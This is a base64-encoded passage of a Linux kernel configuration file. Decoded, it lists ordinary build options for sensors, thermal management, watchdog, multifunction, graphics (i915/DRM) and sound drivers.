dAojIENPTkZJR19TRU5TT1JTX1RNUDUxMyBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfVklB
X0NQVVRFTVAgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1ZJQTY4NkEgaXMgbm90IHNldAoj
IENPTkZJR19TRU5TT1JTX1ZUMTIxMSBpcyBub3Qgc2V0CiMgQ09ORklHX1NFTlNPUlNfVlQ4MjMx
IGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19XODM3NzNHIGlzIG5vdCBzZXQKIyBDT05GSUdf
U0VOU09SU19XODM3ODFEIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19XODM3OTFEIGlzIG5v
dCBzZXQKIyBDT05GSUdfU0VOU09SU19XODM3OTJEIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09S
U19XODM3OTMgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1c4Mzc5NSBpcyBub3Qgc2V0CiMg
Q09ORklHX1NFTlNPUlNfVzgzTDc4NVRTIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19XODNM
Nzg2TkcgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1c4MzYyN0hGIGlzIG5vdCBzZXQKIyBD
T05GSUdfU0VOU09SU19XODM2MjdFSEYgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX1hHRU5F
IGlzIG5vdCBzZXQKCiMKIyBBQ1BJIGRyaXZlcnMKIwojIENPTkZJR19TRU5TT1JTX0FDUElfUE9X
RVIgaXMgbm90IHNldAojIENPTkZJR19TRU5TT1JTX0FUSzAxMTAgaXMgbm90IHNldAojIENPTkZJ
R19TRU5TT1JTX0FTVVNfV01JIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19BU1VTX0VDIGlz
IG5vdCBzZXQKIyBDT05GSUdfU0VOU09SU19IUF9XTUkgaXMgbm90IHNldApDT05GSUdfVEhFUk1B
TD15CiMgQ09ORklHX1RIRVJNQUxfTkVUTElOSyBpcyBub3Qgc2V0CiMgQ09ORklHX1RIRVJNQUxf
U1RBVElTVElDUyBpcyBub3Qgc2V0CiMgQ09ORklHX1RIRVJNQUxfREVCVUdGUyBpcyBub3Qgc2V0
CkNPTkZJR19USEVSTUFMX0VNRVJHRU5DWV9QT1dFUk9GRl9ERUxBWV9NUz0wCkNPTkZJR19USEVS
TUFMX0hXTU9OPXkKQ09ORklHX1RIRVJNQUxfREVGQVVMVF9HT1ZfU1RFUF9XSVNFPXkKIyBDT05G
SUdfVEhFUk1BTF9ERUZBVUxUX0dPVl9GQUlSX1NIQVJFIGlzIG5vdCBzZXQKIyBDT05GSUdfVEhF
Uk1BTF9ERUZBVUxUX0dPVl9VU0VSX1NQQUNFIGlzIG5vdCBzZXQKIyBDT05GSUdfVEhFUk1BTF9H
T1ZfRkFJUl9TSEFSRSBpcyBub3Qgc2V0CkNPTkZJR19USEVSTUFMX0dPVl9TVEVQX1dJU0U9eQoj
IENPTkZJR19USEVSTUFMX0dPVl9CQU5HX0JBTkcgaXMgbm90IHNldApDT05GSUdfVEhFUk1BTF9H
T1ZfVVNFUl9TUEFDRT15CiMgQ09ORklHX1RIRVJNQUxfRU1VTEFUSU9OIGlzIG5vdCBzZXQKCiMK
IyBJbnRlbCB0aGVybWFsIGRyaXZlcnMKIwojIENPTkZJR19JTlRFTF9QT1dFUkNMQU1QIGlzIG5v
dCBzZXQKQ09ORklHX1g4Nl9USEVSTUFMX1ZFQ1RPUj15CkNPTkZJR19JTlRFTF9UQ0M9eQpDT05G
SUdfWDg2X1BLR19URU1QX1RIRVJNQUw9bQojIENPTkZJR19JTlRFTF9TT0NfRFRTX1RIRVJNQUwg
aXMgbm90IHNldAoKIwojIEFDUEkgSU5UMzQwWCB0aGVybWFsIGRyaXZlcnMKIwojIENPTkZJR19J
TlQzNDBYX1RIRVJNQUwgaXMgbm90IHNldAojIGVuZCBvZiBBQ1BJIElOVDM0MFggdGhlcm1hbCBk
cml2ZXJzCgojIENPTkZJR19JTlRFTF9QQ0hfVEhFUk1BTCBpcyBub3Qgc2V0CiMgQ09ORklHX0lO
VEVMX1RDQ19DT09MSU5HIGlzIG5vdCBzZXQKIyBDT05GSUdfSU5URUxfSEZJX1RIRVJNQUwgaXMg
bm90IHNldAojIGVuZCBvZiBJbnRlbCB0aGVybWFsIGRyaXZlcnMKCkNPTkZJR19XQVRDSERPRz15
CiMgQ09ORklHX1dBVENIRE9HX0NPUkUgaXMgbm90IHNldAojIENPTkZJR19XQVRDSERPR19OT1dB
WU9VVCBpcyBub3Qgc2V0CkNPTkZJR19XQVRDSERPR19IQU5ETEVfQk9PVF9FTkFCTEVEPXkKQ09O
RklHX1dBVENIRE9HX09QRU5fVElNRU9VVD0wCiMgQ09ORklHX1dBVENIRE9HX1NZU0ZTIGlzIG5v
dCBzZXQKIyBDT05GSUdfV0FUQ0hET0dfSFJUSU1FUl9QUkVUSU1FT1VUIGlzIG5vdCBzZXQKCiMK
IyBXYXRjaGRvZyBQcmV0aW1lb3V0IEdvdmVybm9ycwojCgojCiMgV2F0Y2hkb2cgRGV2aWNlIERy
aXZlcnMKIwojIENPTkZJR19TT0ZUX1dBVENIRE9HIGlzIG5vdCBzZXQKIyBDT05GSUdfTEVOT1ZP
X1NFMTBfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfV0RBVF9XRFQgaXMgbm90IHNldAojIENPTkZJ
R19YSUxJTlhfV0FUQ0hET0cgaXMgbm90IHNldAojIENPTkZJR19aSUlSQVZFX1dBVENIRE9HIGlz
IG5vdCBzZXQKIyBDT05GSUdfQ0FERU5DRV9XQVRDSERPRyBpcyBub3Qgc2V0CiMgQ09ORklHX0RX
X1dBVENIRE9HIGlzIG5vdCBzZXQKIyBDT05GSUdfTUFYNjNYWF9XQVRDSERPRyBpcyBub3Qgc2V0
CiMgQ09ORklHX0FDUVVJUkVfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfQURWQU5URUNIX1dEVCBp
cyBub3Qgc2V0CiMgQ09ORklHX0FEVkFOVEVDSF9FQ19XRFQgaXMgbm90IHNldAojIENPTkZJR19B
TElNMTUzNV9XRFQgaXMgbm90IHNldAojIENPTkZJR19BTElNNzEwMV9XRFQgaXMgbm90IHNldAoj
IENPTkZJR19FQkNfQzM4NF9XRFQgaXMgbm90IHNldAojIENPTkZJR19FWEFSX1dEVCBpcyBub3Qg
c2V0CiMgQ09ORklHX0Y3MTgwOEVfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfU1A1MTAwX1RDTyBp
cyBub3Qgc2V0CiMgQ09ORklHX1NCQ19GSVRQQzJfV0FUQ0hET0cgaXMgbm90IHNldAojIENPTkZJ
R19FVVJPVEVDSF9XRFQgaXMgbm90IHNldAojIENPTkZJR19JQjcwMF9XRFQgaXMgbm90IHNldAoj
IENPTkZJR19JQk1BU1IgaXMgbm90IHNldAojIENPTkZJR19XQUZFUl9XRFQgaXMgbm90IHNldAoj
IENPTkZJR19JNjMwMEVTQl9XRFQgaXMgbm90IHNldAojIENPTkZJR19JRTZYWF9XRFQgaXMgbm90
IHNldAojIENPTkZJR19JVENPX1dEVCBpcyBub3Qgc2V0CiMgQ09ORklHX0lUODcxMkZfV0RUIGlz
IG5vdCBzZXQKIyBDT05GSUdfSVQ4N19XRFQgaXMgbm90IHNldAojIENPTkZJR19IUF9XQVRDSERP
RyBpcyBub3Qgc2V0CiMgQ09ORklHX1NDMTIwMF9XRFQgaXMgbm90IHNldAojIENPTkZJR19QQzg3
NDEzX1dEVCBpcyBub3Qgc2V0CiMgQ09ORklHX05WX1RDTyBpcyBub3Qgc2V0CiMgQ09ORklHXzYw
WFhfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfQ1BVNV9XRFQgaXMgbm90IHNldAojIENPTkZJR19T
TVNDX1NDSDMxMVhfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfU01TQzM3Qjc4N19XRFQgaXMgbm90
IHNldAojIENPTkZJR19UUU1YODZfV0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfVklBX1dEVCBpcyBu
b3Qgc2V0CiMgQ09ORklHX1c4MzYyN0hGX1dEVCBpcyBub3Qgc2V0CiMgQ09ORklHX1c4Mzg3N0Zf
V0RUIGlzIG5vdCBzZXQKIyBDT05GSUdfVzgzOTc3Rl9XRFQgaXMgbm90IHNldAojIENPTkZJR19N
QUNIWl9XRFQgaXMgbm90IHNldAojIENPTkZJR19TQkNfRVBYX0MzX1dBVENIRE9HIGlzIG5vdCBz
ZXQKIyBDT05GSUdfSU5URUxfTUVJX1dEVCBpcyBub3Qgc2V0CiMgQ09ORklHX05JOTAzWF9XRFQg
aXMgbm90IHNldAojIENPTkZJR19OSUM3MDE4X1dEVCBpcyBub3Qgc2V0CgojCiMgUENJLWJhc2Vk
IFdhdGNoZG9nIENhcmRzCiMKIyBDT05GSUdfUENJUENXQVRDSERPRyBpcyBub3Qgc2V0CiMgQ09O
RklHX1dEVFBDSSBpcyBub3Qgc2V0CgojCiMgVVNCLWJhc2VkIFdhdGNoZG9nIENhcmRzCiMKIyBD
T05GSUdfVVNCUENXQVRDSERPRyBpcyBub3Qgc2V0CkNPTkZJR19TU0JfUE9TU0lCTEU9eQojIENP
TkZJR19TU0IgaXMgbm90IHNldApDT05GSUdfQkNNQV9QT1NTSUJMRT15CiMgQ09ORklHX0JDTUEg
aXMgbm90IHNldAoKIwojIE11bHRpZnVuY3Rpb24gZGV2aWNlIGRyaXZlcnMKIwojIENPTkZJR19N
RkRfQVMzNzExIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1NNUFJPIGlzIG5vdCBzZXQKIyBDT05G
SUdfUE1JQ19BRFA1NTIwIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX0JDTTU5MFhYIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTUZEX0JEOTU3MU1XViBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9BWFAyMFhf
STJDIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX0NTNDJMNDNfSTJDIGlzIG5vdCBzZXQKIyBDT05G
SUdfTUZEX01BREVSQSBpcyBub3Qgc2V0CiMgQ09ORklHX1BNSUNfREE5MDNYIGlzIG5vdCBzZXQK
IyBDT05GSUdfTUZEX0RBOTA1Ml9JMkMgaXMgbm90IHNldAojIENPTkZJR19NRkRfREE5MDU1IGlz
IG5vdCBzZXQKIyBDT05GSUdfTUZEX0RBOTA2MiBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9EQTkw
NjMgaXMgbm90IHNldAojIENPTkZJR19NRkRfREE5MTUwIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZE
X0RMTjIgaXMgbm90IHNldAojIENPTkZJR19NRkRfTUMxM1hYWF9JMkMgaXMgbm90IHNldAojIENP
TkZJR19NRkRfTVAyNjI5IGlzIG5vdCBzZXQKIyBDT05GSUdfTFBDX0lDSCBpcyBub3Qgc2V0CiMg
Q09ORklHX0xQQ19TQ0ggaXMgbm90IHNldAojIENPTkZJR19NRkRfSU5URUxfTFBTU19BQ1BJIGlz
IG5vdCBzZXQKIyBDT05GSUdfTUZEX0lOVEVMX0xQU1NfUENJIGlzIG5vdCBzZXQKIyBDT05GSUdf
TUZEX0lOVEVMX1BNQ19CWFQgaXMgbm90IHNldAojIENPTkZJR19NRkRfSVFTNjJYIGlzIG5vdCBz
ZXQKIyBDT05GSUdfTUZEX0pBTlpfQ01PRElPIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX0tFTVBM
RCBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF84OFBNODAwIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZE
Xzg4UE04MDUgaXMgbm90IHNldAojIENPTkZJR19NRkRfODhQTTg2MFggaXMgbm90IHNldAojIENP
TkZJR19NRkRfTUFYMTQ1NzcgaXMgbm90IHNldAojIENPTkZJR19NRkRfTUFYNzc1NDEgaXMgbm90
IHNldAojIENPTkZJR19NRkRfTUFYNzc2OTMgaXMgbm90IHNldAojIENPTkZJR19NRkRfTUFYNzc4
NDMgaXMgbm90IHNldAojIENPTkZJR19NRkRfTUFYODkwNyBpcyBub3Qgc2V0CiMgQ09ORklHX01G
RF9NQVg4OTI1IGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX01BWDg5OTcgaXMgbm90IHNldAojIENP
TkZJR19NRkRfTUFYODk5OCBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9NVDYzNjAgaXMgbm90IHNl
dAojIENPTkZJR19NRkRfTVQ2MzcwIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX01UNjM5NyBpcyBu
b3Qgc2V0CiMgQ09ORklHX01GRF9NRU5GMjFCTUMgaXMgbm90IHNldAojIENPTkZJR19NRkRfVklQ
RVJCT0FSRCBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9SRVRVIGlzIG5vdCBzZXQKIyBDT05GSUdf
TUZEX1BDRjUwNjMzIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1NZNzYzNkEgaXMgbm90IHNldAoj
IENPTkZJR19NRkRfUkRDMzIxWCBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9SVDQ4MzEgaXMgbm90
IHNldAojIENPTkZJR19NRkRfUlQ1MDMzIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1JUNTEyMCBp
cyBub3Qgc2V0CiMgQ09ORklHX01GRF9SQzVUNTgzIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1NJ
NDc2WF9DT1JFIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1NNNTAxIGlzIG5vdCBzZXQKIyBDT05G
SUdfTUZEX1NLWTgxNDUyIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1NZU0NPTiBpcyBub3Qgc2V0
CiMgQ09ORklHX01GRF9MUDM5NDMgaXMgbm90IHNldAojIENPTkZJR19NRkRfTFA4Nzg4IGlzIG5v
dCBzZXQKIyBDT05GSUdfTUZEX1RJX0xNVSBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9QQUxNQVMg
aXMgbm90IHNldAojIENPTkZJR19UUFM2MTA1WCBpcyBub3Qgc2V0CiMgQ09ORklHX1RQUzY1MDdY
IGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1RQUzY1MDg2IGlzIG5vdCBzZXQKIyBDT05GSUdfTUZE
X1RQUzY1MDkwIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1RJX0xQODczWCBpcyBub3Qgc2V0CiMg
Q09ORklHX01GRF9UUFM2NTg2WCBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9UUFM2NTkxMl9JMkMg
aXMgbm90IHNldAojIENPTkZJR19NRkRfVFBTNjU5NF9JMkMgaXMgbm90IHNldAojIENPTkZJR19U
V0w0MDMwX0NPUkUgaXMgbm90IHNldAojIENPTkZJR19UV0w2MDQwX0NPUkUgaXMgbm90IHNldAoj
IENPTkZJR19NRkRfV0wxMjczX0NPUkUgaXMgbm90IHNldAojIENPTkZJR19NRkRfTE0zNTMzIGlz
IG5vdCBzZXQKIyBDT05GSUdfTUZEX1RRTVg4NiBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9WWDg1
NSBpcyBub3Qgc2V0CiMgQ09ORklHX01GRF9BUklaT05BX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklH
X01GRF9XTTg0MDAgaXMgbm90IHNldAojIENPTkZJR19NRkRfV004MzFYX0kyQyBpcyBub3Qgc2V0
CiMgQ09ORklHX01GRF9XTTgzNTBfSTJDIGlzIG5vdCBzZXQKIyBDT05GSUdfTUZEX1dNODk5NCBp
cyBub3Qgc2V0CiMgQ09ORklHX01GRF9BVEMyNjBYX0kyQyBpcyBub3Qgc2V0CiMgQ09ORklHX01G
RF9DUzQwTDUwX0kyQyBpcyBub3Qgc2V0CiMgZW5kIG9mIE11bHRpZnVuY3Rpb24gZGV2aWNlIGRy
aXZlcnMKCiMgQ09ORklHX1JFR1VMQVRPUiBpcyBub3Qgc2V0CiMgQ09ORklHX1JDX0NPUkUgaXMg
bm90IHNldAoKIwojIENFQyBzdXBwb3J0CiMKIyBDT05GSUdfTUVESUFfQ0VDX1NVUFBPUlQgaXMg
bm90IHNldAojIGVuZCBvZiBDRUMgc3VwcG9ydAoKIyBDT05GSUdfTUVESUFfU1VQUE9SVCBpcyBu
b3Qgc2V0CgojCiMgR3JhcGhpY3Mgc3VwcG9ydAojCkNPTkZJR19BUEVSVFVSRV9IRUxQRVJTPXkK
Q09ORklHX1ZJREVPPXkKIyBDT05GSUdfQVVYRElTUExBWSBpcyBub3Qgc2V0CkNPTkZJR19BR1A9
eQpDT05GSUdfQUdQX0FNRDY0PXkKQ09ORklHX0FHUF9JTlRFTD15CiMgQ09ORklHX0FHUF9TSVMg
aXMgbm90IHNldAojIENPTkZJR19BR1BfVklBIGlzIG5vdCBzZXQKQ09ORklHX0lOVEVMX0dUVD15
CiMgQ09ORklHX1ZHQV9TV0lUQ0hFUk9PIGlzIG5vdCBzZXQKQ09ORklHX0RSTT15CkNPTkZJR19E
Uk1fTUlQSV9EU0k9eQojIENPTkZJR19EUk1fREVCVUdfTU0gaXMgbm90IHNldApDT05GSUdfRFJN
X0tNU19IRUxQRVI9eQojIENPTkZJR19EUk1fUEFOSUMgaXMgbm90IHNldAojIENPTkZJR19EUk1f
RkJERVZfRU1VTEFUSU9OIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX0xPQURfRURJRF9GSVJNV0FS
RSBpcyBub3Qgc2V0CkNPTkZJR19EUk1fRElTUExBWV9IRUxQRVI9eQojIENPTkZJR19EUk1fRElT
UExBWV9EUF9BVVhfQ0VDIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX0RJU1BMQVlfRFBfQVVYX0NI
QVJERVYgaXMgbm90IHNldApDT05GSUdfRFJNX0RJU1BMQVlfRFBfSEVMUEVSPXkKQ09ORklHX0RS
TV9ESVNQTEFZX0hEQ1BfSEVMUEVSPXkKQ09ORklHX0RSTV9ESVNQTEFZX0hETUlfSEVMUEVSPXkK
Q09ORklHX0RSTV9UVE09eQpDT05GSUdfRFJNX0JVRERZPXkKQ09ORklHX0RSTV9HRU1fU0hNRU1f
SEVMUEVSPXkKCiMKIyBJMkMgZW5jb2RlciBvciBoZWxwZXIgY2hpcHMKIwojIENPTkZJR19EUk1f
STJDX0NINzAwNiBpcyBub3Qgc2V0CiMgQ09ORklHX0RSTV9JMkNfU0lMMTY0IGlzIG5vdCBzZXQK
IyBDT05GSUdfRFJNX0kyQ19OWFBfVERBOTk4WCBpcyBub3Qgc2V0CiMgQ09ORklHX0RSTV9JMkNf
TlhQX1REQTk5NTAgaXMgbm90IHNldAojIGVuZCBvZiBJMkMgZW5jb2RlciBvciBoZWxwZXIgY2hp
cHMKCiMKIyBBUk0gZGV2aWNlcwojCiMgZW5kIG9mIEFSTSBkZXZpY2VzCgojIENPTkZJR19EUk1f
UkFERU9OIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX0FNREdQVSBpcyBub3Qgc2V0CiMgQ09ORklH
X0RSTV9OT1VWRUFVIGlzIG5vdCBzZXQKQ09ORklHX0RSTV9JOTE1PXkKQ09ORklHX0RSTV9JOTE1
X0ZPUkNFX1BST0JFPSIiCkNPTkZJR19EUk1fSTkxNV9DQVBUVVJFX0VSUk9SPXkKQ09ORklHX0RS
TV9JOTE1X0NPTVBSRVNTX0VSUk9SPXkKQ09ORklHX0RSTV9JOTE1X1VTRVJQVFI9eQpDT05GSUdf
RFJNX0k5MTVfUkVRVUVTVF9USU1FT1VUPTIwMDAwCkNPTkZJR19EUk1fSTkxNV9GRU5DRV9USU1F
T1VUPTEwMDAwCkNPTkZJR19EUk1fSTkxNV9VU0VSRkFVTFRfQVVUT1NVU1BFTkQ9MjUwCkNPTkZJ
R19EUk1fSTkxNV9IRUFSVEJFQVRfSU5URVJWQUw9MjUwMApDT05GSUdfRFJNX0k5MTVfUFJFRU1Q
VF9USU1FT1VUPTY0MApDT05GSUdfRFJNX0k5MTVfUFJFRU1QVF9USU1FT1VUX0NPTVBVVEU9NzUw
MApDT05GSUdfRFJNX0k5MTVfTUFYX1JFUVVFU1RfQlVTWVdBSVQ9ODAwMApDT05GSUdfRFJNX0k5
MTVfU1RPUF9USU1FT1VUPTEwMApDT05GSUdfRFJNX0k5MTVfVElNRVNMSUNFX0RVUkFUSU9OPTEK
IyBDT05GSUdfRFJNX1hFIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX1ZHRU0gaXMgbm90IHNldAoj
IENPTkZJR19EUk1fVktNUyBpcyBub3Qgc2V0CiMgQ09ORklHX0RSTV9WTVdHRlggaXMgbm90IHNl
dAojIENPTkZJR19EUk1fR01BNTAwIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX1VETCBpcyBub3Qg
c2V0CiMgQ09ORklHX0RSTV9BU1QgaXMgbm90IHNldAojIENPTkZJR19EUk1fTUdBRzIwMCBpcyBu
b3Qgc2V0CiMgQ09ORklHX0RSTV9RWEwgaXMgbm90IHNldApDT05GSUdfRFJNX1ZJUlRJT19HUFU9
eQpDT05GSUdfRFJNX1ZJUlRJT19HUFVfS01TPXkKQ09ORklHX0RSTV9QQU5FTD15CgojCiMgRGlz
cGxheSBQYW5lbHMKIwojIENPTkZJR19EUk1fUEFORUxfUkFTUEJFUlJZUElfVE9VQ0hTQ1JFRU4g
aXMgbm90IHNldAojIGVuZCBvZiBEaXNwbGF5IFBhbmVscwoKQ09ORklHX0RSTV9CUklER0U9eQpD
T05GSUdfRFJNX1BBTkVMX0JSSURHRT15CgojCiMgRGlzcGxheSBJbnRlcmZhY2UgQnJpZGdlcwoj
CiMgQ09ORklHX0RSTV9BTkFMT0dJWF9BTlg3OFhYIGlzIG5vdCBzZXQKIyBlbmQgb2YgRGlzcGxh
eSBJbnRlcmZhY2UgQnJpZGdlcwoKIyBDT05GSUdfRFJNX0VUTkFWSVYgaXMgbm90IHNldAojIENP
TkZJR19EUk1fQk9DSFMgaXMgbm90IHNldAojIENPTkZJR19EUk1fQ0lSUlVTX1FFTVUgaXMgbm90
IHNldAojIENPTkZJR19EUk1fR00xMlUzMjAgaXMgbm90IHNldAojIENPTkZJR19EUk1fU0lNUExF
RFJNIGlzIG5vdCBzZXQKIyBDT05GSUdfRFJNX1ZCT1hWSURFTyBpcyBub3Qgc2V0CiMgQ09ORklH
X0RSTV9HVUQgaXMgbm90IHNldAojIENPTkZJR19EUk1fU1NEMTMwWCBpcyBub3Qgc2V0CkNPTkZJ
R19EUk1fUEFORUxfT1JJRU5UQVRJT05fUVVJUktTPXkKCiMKIyBGcmFtZSBidWZmZXIgRGV2aWNl
cwojCiMgQ09ORklHX0ZCIGlzIG5vdCBzZXQKIyBlbmQgb2YgRnJhbWUgYnVmZmVyIERldmljZXMK
CiMKIyBCYWNrbGlnaHQgJiBMQ0QgZGV2aWNlIHN1cHBvcnQKIwojIENPTkZJR19MQ0RfQ0xBU1Nf
REVWSUNFIGlzIG5vdCBzZXQKQ09ORklHX0JBQ0tMSUdIVF9DTEFTU19ERVZJQ0U9eQojIENPTkZJ
R19CQUNLTElHSFRfS1REMjgwMSBpcyBub3Qgc2V0CiMgQ09ORklHX0JBQ0tMSUdIVF9LVFo4ODY2
IGlzIG5vdCBzZXQKIyBDT05GSUdfQkFDS0xJR0hUX0FQUExFIGlzIG5vdCBzZXQKIyBDT05GSUdf
QkFDS0xJR0hUX1FDT01fV0xFRCBpcyBub3Qgc2V0CiMgQ09ORklHX0JBQ0tMSUdIVF9TQUhBUkEg
aXMgbm90IHNldAojIENPTkZJR19CQUNLTElHSFRfQURQODg2MCBpcyBub3Qgc2V0CiMgQ09ORklH
X0JBQ0tMSUdIVF9BRFA4ODcwIGlzIG5vdCBzZXQKIyBDT05GSUdfQkFDS0xJR0hUX0xNMzUwOSBp
cyBub3Qgc2V0CiMgQ09ORklHX0JBQ0tMSUdIVF9MTTM2MzkgaXMgbm90IHNldAojIENPTkZJR19C
QUNLTElHSFRfTFY1MjA3TFAgaXMgbm90IHNldAojIENPTkZJR19CQUNLTElHSFRfQkQ2MTA3IGlz
IG5vdCBzZXQKIyBDT05GSUdfQkFDS0xJR0hUX0FSQ1hDTk4gaXMgbm90IHNldAojIGVuZCBvZiBC
YWNrbGlnaHQgJiBMQ0QgZGV2aWNlIHN1cHBvcnQKCkNPTkZJR19IRE1JPXkKCiMKIyBDb25zb2xl
IGRpc3BsYXkgZHJpdmVyIHN1cHBvcnQKIwpDT05GSUdfVkdBX0NPTlNPTEU9eQpDT05GSUdfRFVN
TVlfQ09OU09MRT15CkNPTkZJR19EVU1NWV9DT05TT0xFX0NPTFVNTlM9ODAKQ09ORklHX0RVTU1Z
X0NPTlNPTEVfUk9XUz0yNQojIGVuZCBvZiBDb25zb2xlIGRpc3BsYXkgZHJpdmVyIHN1cHBvcnQK
IyBlbmQgb2YgR3JhcGhpY3Mgc3VwcG9ydAoKIyBDT05GSUdfRFJNX0FDQ0VMIGlzIG5vdCBzZXQK
Q09ORklHX1NPVU5EPXkKQ09ORklHX1NORD15CkNPTkZJR19TTkRfVElNRVI9eQpDT05GSUdfU05E
X1BDTT15CkNPTkZJR19TTkRfSFdERVA9eQpDT05GSUdfU05EX1NFUV9ERVZJQ0U9eQpDT05GSUdf
U05EX0pBQ0s9eQpDT05GSUdfU05EX0pBQ0tfSU5QVVRfREVWPXkKIyBDT05GSUdfU05EX09TU0VN
VUwgaXMgbm90IHNldApDT05GSUdfU05EX1BDTV9USU1FUj15CkNPTkZJR19TTkRfSFJUSU1FUj15
CiMgQ09ORklHX1NORF9EWU5BTUlDX01JTk9SUyBpcyBub3Qgc2V0CkNPTkZJR19TTkRfU1VQUE9S
VF9PTERfQVBJPXkKQ09ORklHX1NORF9QUk9DX0ZTPXkKQ09ORklHX1NORF9WRVJCT1NFX1BST0NG
Uz15CiMgQ09ORklHX1NORF9WRVJCT1NFX1BSSU5USyBpcyBub3Qgc2V0CkNPTkZJR19TTkRfQ1RM
X0ZBU1RfTE9PS1VQPXkKIyBDT05GSUdfU05EX0RFQlVHIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X0NUTF9JTlBVVF9WQUxJREFUSU9OIGlzIG5vdCBzZXQKQ09ORklHX1NORF9WTUFTVEVSPXkKQ09O
RklHX1NORF9ETUFfU0dCVUY9eQpDT05GSUdfU05EX1NFUVVFTkNFUj15CkNPTkZJR19TTkRfU0VR
X0RVTU1ZPXkKQ09ORklHX1NORF9TRVFfSFJUSU1FUl9ERUZBVUxUPXkKIyBDT05GSUdfU05EX1NF
UV9VTVAgaXMgbm90IHNldApDT05GSUdfU05EX0RSSVZFUlM9eQojIENPTkZJR19TTkRfUENTUCBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9EVU1NWSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9BTE9P
UCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9QQ01URVNUIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X1ZJUk1JREkgaXMgbm90IHNldAojIENPTkZJR19TTkRfTVRQQVYgaXMgbm90IHNldAojIENPTkZJ
R19TTkRfU0VSSUFMX1UxNjU1MCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9NUFU0MDEgaXMgbm90
IHNldApDT05GSUdfU05EX1BDST15CiMgQ09ORklHX1NORF9BRDE4ODkgaXMgbm90IHNldAojIENP
TkZJR19TTkRfQUxTMzAwIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0FMUzQwMDAgaXMgbm90IHNl
dAojIENPTkZJR19TTkRfQUxJNTQ1MSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9BU0lIUEkgaXMg
bm90IHNldAojIENPTkZJR19TTkRfQVRJSVhQIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0FUSUlY
UF9NT0RFTSBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9BVTg4MTAgaXMgbm90IHNldAojIENPTkZJ
R19TTkRfQVU4ODIwIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0FVODgzMCBpcyBub3Qgc2V0CiMg
Q09ORklHX1NORF9BVzIgaXMgbm90IHNldAojIENPTkZJR19TTkRfQVpUMzMyOCBpcyBub3Qgc2V0
CiMgQ09ORklHX1NORF9CVDg3WCBpcyBub3Qgc2V0CiMgQ09ORklHX1NORF9DQTAxMDYgaXMgbm90
IHNldAojIENPTkZJR19TTkRfQ01JUENJIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX09YWUdFTiBp
cyBub3Qgc2V0CiMgQ09ORklHX1NORF9DUzQyODEgaXMgbm90IHNldAojIENPTkZJR19TTkRfQ1M0
NlhYIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX0NUWEZJIGlzIG5vdCBzZXQKIyBDT05GSUdfU05E
X0RBUkxBMjAgaXMgbm90IHNldAojIENPTkZJR19TTkRfR0lOQTIwIGlzIG5vdCBzZXQKIyBDT05G
SUdfU05EX0xBWUxBMjAgaXMgbm90IHNldAojIENPTkZJR19TTkRfREFSTEEyNCBpcyBub3Qgc2V0
CiMgQ09ORklHX1NORF9HSU5BMjQgaXMgbm90IHNldAojIENPTkZJR19TTkRfTEFZTEEyNCBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NORF9NT05BIGlzIG5vdCBzZXQKIyBDT05GSUdfU05EX01JQSBpcyBu
b3Qgc2V0CiMgQ09ORklHX1NORF9FQ0hPM0cgaXMgbm90IHNldAojIENPTkZJR19TTkRfSU5ESUdP
